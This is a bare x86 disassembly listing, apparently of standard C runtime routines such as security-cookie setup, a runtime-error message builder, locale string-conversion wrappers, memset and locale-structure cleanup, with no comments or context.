  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
